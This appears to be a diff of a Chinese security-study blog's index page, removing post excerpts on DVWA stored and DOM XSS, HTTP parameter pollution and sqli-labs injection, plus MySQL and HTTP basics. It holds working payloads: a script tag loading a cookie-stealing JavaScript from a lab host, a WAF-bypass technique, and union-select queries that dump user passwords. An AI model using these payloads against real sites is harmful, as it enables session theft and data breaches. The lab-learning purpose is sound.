-<p>简单理解就是：XSS代码被提交给站点–&gt;站点把XSS代码存储进数据库—&gt;当该页面再次被请求时。server发送已经被植入XSS代码的数据给client—&gt;client运行XSS代码。</p>
-<p>然后构造真正的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://192.168.43.40/test/cookie.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>由于message最大只能输入50字节的内容，所以这里我们需要修改其maxlength.<br><img src="/2019/03/05/XSS-反射型/XSS-存储型/2.png" alt=""></p>
-<p>同样的我们可以在数据库中查看到其获取的cookie值</p>
-<h1 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h1><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">$name    = trim( $_POST[ <span class="string">'txtName'</span> ] ); </span><br><span class="line"></span><br><span class="line">$message = htmlspecialchars( $message ); </span><br><span class="line"></span><br><span class="line">$name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br></pre></td></tr></table></figure></p>
-<p>与反射型相同，此处便不再重复了。</p>
-<h1 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h1><p>这个同反射型的过滤机制分析方法一致，此处便不再重复。</p>
-<h1 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h1><p>DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。<br>DOM是一个与平台、编程语言无关的接口，它同意程序或脚本动态地訪问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有非常多对象。当中一些是用户能够操纵的，如uRI.location，refelTer等。client的脚本程序能够通过DOM动态地检查和改动页面内容。它不依赖于提交数据到server端。而从client获得DOM中的数据在本地运行，假设DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。<br>DOM—based XSS攻击源于DOM相关的属性和方法。被插入用于XSS攻击的脚本。一个典型的样例例如以下：<br>HTTP请求http：//www．Xss.com/hello.html?name=test使用下面的脚本打印出登录用户test的名字，即<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;</span><br><span class="line"><span class="keyword">var</span> pos=docmnent.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>; </span><br><span class="line">document．write (document.URL.substring(pos,document.URL.length))。</span><br><span class="line"><span class="comment">//以上代码将会输出&lt;script&gt;alert('test')&lt;/script&gt; </span></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure></p>
-<p>假设这个脚本用于请求时，就导致XSS攻击的发生。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http：//www.Xss.com/hello.html?name=&lt;script&gt;alert(&apos;test&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>当用户点击这个链接，server返回包括上面脚本的HTML静态文本，用户浏览器把HTML文本解析成DOM，DOM中的document对象URL属性的值就是当前页而的URL。</p>
-<p>在脚本被解析时，这个URL属性值的一部分被写入HTML文本，而这部分HTML文本却是JavaScript脚本，这使得<script>alert(‘test’)</script>成为页面终于显示的HTML文本。从而导致DOM XSS攻击发生。</p>
-<p>然后现在构造payload</p>
-<p><a href="http://192.168.43.40/dvwa/vulnerabilities/xss_d/?default=English#" target="_blank" rel="noopener">http://192.168.43.40/dvwa/vulnerabilities/xss_d/?default=English#</a><script src="http://192.168.43.40/test/cookie.js"></script></p>
-<p>完了，写不下去了，发现怎么做都不对，等我学完javascript和ajax后，再来分析。</p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/05/XSS-反射型/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -657,7 +784,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -753,39 +880,19 @@
       
         
           
-            <p>在重新学习sqlilab时看到HTTP污染，之前没有好好理解悔不当初啊。</p>
-<p>现在认真记录一下，重视基础<br>参考文章：<a href="https://blog.csdn.net/eatmilkboy/article/details/6761407" target="_blank" rel="noopener">https://blog.csdn.net/eatmilkboy/article/details/6761407</a></p>
-<h1 id="HTTP污染介绍"><a href="#HTTP污染介绍" class="headerlink" title="HTTP污染介绍"></a>HTTP污染介绍</h1><p>HPP是HTTP Parameter Pollution的缩写。这个漏洞由S. di Paola 与L. Caret Toni在2009年的OWASP上首次公布。这也是一种注入型的漏洞，攻击者通过在HTTP请求中插入特定的参数来发起攻击。如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。下面对这个漏洞的原理做一下详细解释。</p>
-<p>在跟服务器进行交互的过程中，客户端往往会在GET/POST请求里面带上参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /foo?par1=val1&amp;par2=val2 HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /foo HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 19</span><br></pre></td></tr></table></figure></p>
-<p>如上面的例子所示，这些参数会以名称-值对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。</p>
-<p><strong>重点来了</strong>：<br>对于不同的服务器，处理同名称但多参数情况的方式不一样，见下表：<br><img src="/2019/03/03/HTTP污染拙见/1.png" alt=""></p>
-<p>举个例子，虽然也是别人帖子上看的，但是能很好理解这个表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.google.com/search?q=italy&amp;q=china</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/03/HTTP污染拙见/2.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://search.yahoo.com/search?p=italy&amp;p=china</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/03/03/HTTP污染拙见/3.png" alt=""></p>
-<p>如果同时提供2个搜索的关键字参数给Google，那么Google会对2个参数都进行查询；但是Yahoo则不一样，它只会处理后面一个参数。</p>
-<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>现在举一个HPP漏洞的例子</p>
-<h2 id="对客户端的攻击"><a href="#对客户端的攻击" class="headerlink" title="对客户端的攻击"></a>对客户端的攻击</h2><p>假如有这么一个网站，用来给两个人投票<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Url : http:<span class="comment">//host/election.jsp?poll_id=4568</span></span><br><span class="line"> </span><br><span class="line">Link1: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=zhang"</span>&gt;为张三投票&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">Link2: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=li"</span>&gt;为李四投票&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
-<p>而实现投票的链接为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID = Request.getParameter(<span class="string">"pool_id"</span>)</span><br><span class="line"> </span><br><span class="line">href_link = <span class="string">"vote.jsp?poll_id="</span> + ID + <span class="string">"&amp;candidate=xyz"</span></span><br></pre></td></tr></table></figure></p>
-<p>那么现在，攻击者恶意地生成如下的URL给投票人<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http_://host/election.jsp?poll_id=4568%26candidate%3Dzhang</span><br></pre></td></tr></table></figure></p>
-<p>那么此后,实现投票的链接就为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">href_link = <span class="string">"vote.jsp?poll_id="</span> + <span class="string">"4568&amp;26candidate=zhang"</span> + <span class="string">"&amp;candidate=xyz"</span></span><br></pre></td></tr></table></figure></p>
-<p>所以页面显示的内容就为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Url : http:<span class="comment">//host/election.jsp?poll_id=4568%26candidate%3Dzhang</span></span><br><span class="line"> </span><br><span class="line">Link1: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=zhang&amp;candidate=zhang"</span>&gt;为张三投票&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">Link2: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=zhang&amp;candidate=li"</span>&gt;为李四投票&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
-<p>那我们可以知道jsp/Tomcat的web服务器，将会处理First参数，后一个不处理，然后这样便会出现最终都是给张三投票的情况。</p>
-<h2 id="对服务器端的攻击"><a href="#对服务器端的攻击" class="headerlink" title="对服务器端的攻击"></a>对服务器端的攻击</h2><p>某网站的实现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void <span class="keyword">private</span> executeBackendRequest(HTTPRequest request)&#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">String action=request.getParameter(<span class="string">"action"</span>);</span><br><span class="line"> </span><br><span class="line">String user=request.getParameter(<span class="string">"userid"</span>);</span><br><span class="line"> </span><br><span class="line">String target=request.getParameter(<span class="string">"target"</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HttpRequest(<span class="string">"http://centralauthencationserver/checkpriviledge.jsp"</span>, <span class="string">"POST"</span>,<span class="string">"action="</span>+action+<span class="string">"&amp;user="</span>+user+<span class="string">"&amp;target="</span>+target);&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* get feedback of whether this user has privilege to perform specified action. If no such privilege, return error, otherwise continue perform the action*/</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HttpRequest(<span class="string">"http://businessserver/performaction.php"</span>, <span class="string">"POST"</span>,<span class="string">"action="</span>+action+<span class="string">"&amp;user="</span>+user+<span class="string">"&amp;target="</span>+target);&#125;</span><br></pre></td></tr></table></figure></p>
-<p>它有个独立的集中认证服务器用来做用户权限方面的认证，另外的业务服务器专门用来处理业务，对外的门户实际上紧紧只是用来做请求的转发。这里不会有SQL注入之类的漏洞，因为不管是集中认证服务器还是业务处理服务器都会对传入的参数的格式做检查，确保不会存在SQL注入。那么哪儿有问题？因为集中认证服务器和业务处理服务器分别由2个团队开发，使用了不同的脚本语言，又没有考虑到HPP的情况。那么看看一个本来仅仅只是具有只读权限的用户，如果发送如下请求给服务器：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http_://frontHost/page?action=view&amp;userid=zhangsan&amp;target=bizreport&amp;action=edit</span><br></pre></td></tr></table></figure></p>
-<p>那么根据我们知道的Web服务器参数处理的方式，这个用户可以通过认证做一些本来没有权限做的事情。</p>
-<p>对于认证服务器，将会执行edit的功能。</p>
-<p>除此以外，HPP还可以被攻击者用来绕过一些Web应用防火墙(WAF, WebApp Firewall)，比如对某页面的SQL注入攻击如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_user.aspx?id=<span class="number">5</span>;select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>+from+users+where+id=<span class="number">1</span>--</span><br></pre></td></tr></table></figure></p>
-<p>这个攻击因为在参数id里面存在明显的SQL注入的模板：select…from…而会被WAF成功拦截。但是如果换成HPP的方式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_user.aspx?id=<span class="number">5</span>;select+<span class="number">1</span>&amp;id=<span class="number">2</span>&amp;id=<span class="number">3</span>+from+users+where+id=<span class="number">1</span>--</span><br></pre></td></tr></table></figure></p>
-<p>这时候没有任何参数具备select…from…的特征，可能就可以绕过WAF的拦截了。</p>
-<h2 id="sqlilab-29"><a href="#sqlilab-29" class="headerlink" title="sqlilab-29"></a>sqlilab-29</h2><p>用28题作为例子<br>可以看到源码中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
-<p>如果在忽略WAF的情况下，我们注入将会发生如下情况：<br><img src="/2019/03/03/HTTP污染拙见/4.png" alt=""></p>
-<p>服务器端是由一个tomcat引擎的jsp服务器和一个apache引擎的php服务器组成的，我们发送的数据会先被jsp服务器接受，通过jsp服务器再传给php服务器，然后php服务器再把响应数据发给jsp服务器，最后由jsp服务器传给客户端</p>
-<p>在此jsp服务器起到WAF的作用，jsp会接受第一个参数，php服务器会接受最后一个参数<br>所以我们构造如下payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&amp;id=<span class="number">1</span><span class="string">'--+</span></span><br></pre></td></tr></table></figure></p>
-<p>成功了</p>
-<p>接下来一步一步来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">判读字段数：?id=<span class="number">1</span>&amp;id=<span class="number">1</span><span class="string">' order by 3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断显示位：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> --+</span><br><span class="line"></span><br><span class="line">爆出数据库名：?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">' union select 1,database(),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出表名：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">爆出字段名：?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>users<span class="string">'--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出数据：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,group_concat(username,<span class="string">"~"</span>,password,<span class="string">"~~~~"</span>),<span class="number">3</span> from users --+</span><br></pre></td></tr></table></figure></p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/03/HTTP污染拙见/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -847,7 +954,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -933,40 +1040,19 @@
       
         
           
-            <h1 id="与其哀叹，不如埋头苦干"><a href="#与其哀叹，不如埋头苦干" class="headerlink" title="与其哀叹，不如埋头苦干"></a>与其哀叹，不如埋头苦干</h1><p>怪自己，之前的学习过程中囫囵吞枣，没有好好复习，现在还是个半吊子。<br>所以现在开始，认真记录自己所学的每一点知识，不和别人比。</p>
-<h1 id="mysql之alert命令"><a href="#mysql之alert命令" class="headerlink" title="mysql之alert命令"></a>mysql之alert命令</h1><h2 id="对表字段进行删除，添加，修改"><a href="#对表字段进行删除，添加，修改" class="headerlink" title="对表字段进行删除，添加，修改"></a>对表字段进行删除，添加，修改</h2><p>ALTER 命令及 DROP 子句来删除以上创建表的 i 字段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl  DROP i;</span><br></pre></td></tr></table></figure></p>
-<p>如果数据表中只剩余一个字段则无法使用DROP来删除字段。</p>
-<p>MySQL 中使用 ADD 子句来向数据表中添加列，如下实例在表 testalter_tbl 中添加 i 字段，并定义数据类型:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl ADD i INT;</span><br></pre></td></tr></table></figure></p>
-<p>如果你需要指定新增字段的位置，可以使用MySQL提供的关键字 FIRST (设定位第一列)， AFTER 字段名（设定位于某个字段之后）。</p>
-<p>尝试以下 ALTER TABLE 语句, 在执行成功后，使用 SHOW COLUMNS 查看表结构的变化：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE testalter_tbl DROP i;</span><br><span class="line">ALTER TABLE testalter_tbl ADD i INT FIRST;</span><br><span class="line">ALTER TABLE testalter_tbl DROP i;</span><br><span class="line">ALTER TABLE testalter_tbl ADD i INT AFTER c;</span><br></pre></td></tr></table></figure></p>
-<p>FIRST 和 AFTER 关键字可用于 ADD 与 MODIFY 子句，所以如果你想重置数据表字段的位置就需要先使用 DROP 删除字段然后使用 ADD 来添加字段并设置位置。</p>
-<h2 id="修改字段类型及名称"><a href="#修改字段类型及名称" class="headerlink" title="修改字段类型及名称"></a>修改字段类型及名称</h2><p>如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句 。</p>
-<p>例如，把字段 c 的类型从 CHAR(1) 改为 CHAR(10)，可以执行以下命令:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl MODIFY c CHAR(<span class="number">10</span>);</span><br></pre></td></tr></table></figure></p>
-<p>使用 CHANGE 子句, 语法有很大的不同。 在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl CHANGE i j BIGINT;</span><br><span class="line"></span><br><span class="line">mysql&gt; ALTER TABLE testalter_tbl CHANGE j j INT;</span><br></pre></td></tr></table></figure></p>
-<p>这么看来，似乎CHANGE的作用更大一些。</p>
-<h2 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h2><p>如果需要修改数据表的名称，可以在 ALTER TABLE 语句中使用 RENAME 子句来实现。</p>
-<p>尝试以下实例将数据表 testalter_tbl 重命名为 alter_tbl：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE testalter_tbl RENAME TO alter_tbl;</span><br></pre></td></tr></table></figure></p>
-<p>参考文章：<a href="http://www.runoob.com/mysql/mysql-alter.html" target="_blank" rel="noopener">http://www.runoob.com/mysql/mysql-alter.html</a></p>
-<h1 id="mysql-用户管理和权限设置"><a href="#mysql-用户管理和权限设置" class="headerlink" title="mysql 用户管理和权限设置"></a>mysql 用户管理和权限设置</h1><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;<span class="keyword">use</span> <span class="title">mysql</span>;</span><br></pre></td></tr></table></figure>
-<h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host,user,password from user ;</span><br></pre></td></tr></table></figure>
-<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p>命令：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER <span class="string">'username'</span>@<span class="string">'host'</span> IDENTIFIED BY <span class="string">'password'</span>;</span><br></pre></td></tr></table></figure></p>
-<p>说明：<br>username：你将创建的用户名<br>host：指定该用户在哪个主机上可以登陆，如果是本地用户可用localhost，如果想让该用户可以从任意远程主机登陆，可以使用通配符%<br>password：该用户的登陆密码，密码可以为空，如果为空则该用户可以不需要密码登陆服务器</p>
-<p>例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create user  <span class="string">'zx_root'</span>@<span class="string">'localhost'</span>  IDENTIFIED by <span class="string">'123456'</span>;   <span class="comment">//identified by 会将纯文本密码加密作为散列值存储</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;drop user <span class="string">'username'</span>@<span class="string">'host'</span>;   <span class="comment">//mysql5之前删除用户时必须先使用revoke 删除用户权限，然后删除用户，mysql5之后drop 命令可以删除用户的同时删除用户的相关权限</span></span><br></pre></td></tr></table></figure>
-<h3 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD <span class="keyword">FOR</span> <span class="string">'username'</span>@<span class="string">'host'</span> = PASSWORD(<span class="string">'newpassword'</span>);</span><br></pre></td></tr></table></figure>
-<p>如果是当前登陆用户用:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD = PASSWORD(<span class="string">"newpassword"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD <span class="keyword">FOR</span> <span class="string">'pig'</span>@<span class="string">'%'</span> = PASSWORD(<span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure></p>
-<h2 id="赋权"><a href="#赋权" class="headerlink" title="赋权"></a>赋权</h2><h3 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限"></a>查看用户权限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show grants <span class="keyword">for</span> <span class="string">'username'</span>@<span class="string">'host'</span>;</span><br></pre></td></tr></table></figure>
-<h3 id="赋予权限"><a href="#赋予权限" class="headerlink" title="赋予权限"></a>赋予权限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT privileges ON databasename.tablename TO <span class="string">'username'</span>@<span class="string">'host'</span></span><br></pre></td></tr></table></figure>
-<p>说明:<br>privileges：用户的操作权限，如SELECT，INSERT，UPDATE等，如果要授予所的权限则使用ALL<br>databasename：数据库名<br>tablename：表名，如果要授予该用户对所有数据库和表的相应操作权限则可用<em>表示，如</em>.*</p>
-<p>例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRANT SELECT, INSERT ON test.user TO <span class="string">'pig'</span>@<span class="string">'%'</span>;</span><br><span class="line">GRANT ALL ON *.* TO <span class="string">'pig'</span>@<span class="string">'%'</span>;</span><br><span class="line">GRANT ALL ON maindataplus.* TO <span class="string">'pig'</span>@<span class="string">'%'</span>;</span><br></pre></td></tr></table></figure></p>
-<p>注意:<br>用以上命令授权的用户不能给其它用户授权，如果想让该用户可以授权，用以下命令:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT privileges ON databasename.tablename TO <span class="string">'username'</span>@<span class="string">'host'</span> WITH GRANT OPTION;</span><br></pre></td></tr></table></figure></p>
-<h3 id="回收权限"><a href="#回收权限" class="headerlink" title="回收权限"></a>回收权限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVOKE privilege ON databasename.tablename FROM <span class="string">'username'</span>@<span class="string">'host'</span>;</span><br></pre></td></tr></table></figure>
-<p>说明:<br>privilege, databasename, tablename：同授权部分</p>
-<p>例子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVOKE SELECT ON *.* FROM <span class="string">'pig'</span>@<span class="string">'%'</span>;</span><br></pre></td></tr></table></figure></p>
-<p>参考文章:<a href="https://www.cnblogs.com/sos-blue/p/6852945.html" target="_blank" rel="noopener">https://www.cnblogs.com/sos-blue/p/6852945.html</a></p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/01/mysql基本使用与用户管理/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -1028,7 +1114,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -1114,35 +1200,19 @@
       
         
           
-            <p>HTTP的一些常见面试题<br>参考文章:<a href="https://blog.csdn.net/yicixing7/article/details/79320821" target="_blank" rel="noopener">https://blog.csdn.net/yicixing7/article/details/79320821</a><br>关于HTTP中的COOKIE与SESSION值，上次已做过介绍，这里便不再重复。</p>
-<p>HTTP是基于客户端/服务端（C/S）的架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求/响应协议。</p>
-<p>一个HTTP”客户端”是一个应用程序（Web浏览器或其他任何客户端），通过连接到服务器达到向服务器发送一个或多个HTTP的请求的目的。</p>
-<p>一个HTTP”服务器”同样也是一个应用程序（通常是一个Web服务，如Apache Web服务器或IIS服务器等），通过接收客户端的请求并向客户端发送HTTP响应数据。</p>
-<p>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</p>
-<p>一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。</p>
-<h1 id="客户端请求消息"><a href="#客户端请求消息" class="headerlink" title="客户端请求消息"></a>客户端请求消息</h1><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：<strong>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成</strong><br><img src="/2019/02/28/HTTP笔记/1.png" alt=""></p>
-<h1 id="服务器响应消息"><a href="#服务器响应消息" class="headerlink" title="服务器响应消息"></a>服务器响应消息</h1><p>HTTP响应也由四个部分组成，分别是：<strong>状态行、消息报头、空行和响应正文</strong>。<br><img src="/2019/02/28/HTTP笔记/2.png" alt=""></p>
-<p>实例是一点典型的使用GET来传递数据的实例：</p>
